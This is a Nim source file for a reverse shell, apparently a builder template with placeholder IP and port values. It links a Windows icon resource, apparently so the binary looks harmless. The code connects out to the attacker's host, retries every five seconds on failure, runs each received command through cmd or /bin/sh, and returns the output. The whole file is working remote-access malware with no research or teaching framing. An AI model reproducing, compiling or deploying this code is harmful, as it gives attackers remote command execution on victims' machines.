when defined(gcc) and defined(windows):
  when defined(x86):
    {.link: "demo.res".}
  else:  
    {.link: "Resource/demo_icon.o".}
import net
import osproc
import os
var ip = "IPREPLACE" 
var port = PORTREPLACE
var socket = newSocket()
var finalcommand : string
while true:
    try:
        socket.connect(ip,Port(port)) 
        while true:            
            try:
                socket.send("<nimshell>")
                var command = socket.recvLine() 
                if command == "bye":
                    socket.send("Exit NIM SHELL")
                    socket.close()
                    system.quit(0)
                if  system.hostOS == "windows":
                    finalcommand = "cmd /c" & command&"\n"
                else:
                    finalcommand = "/bin/sh -c" & command
                var (cmdres, _) = execCmdEx(finalcommand)
                
                socket.send(cmdres) 
            except:
                socket.close()
                system.quit(0)
    except:
        echo "Connection failed, try after 5 seconds"
        sleep(5000)
        continue

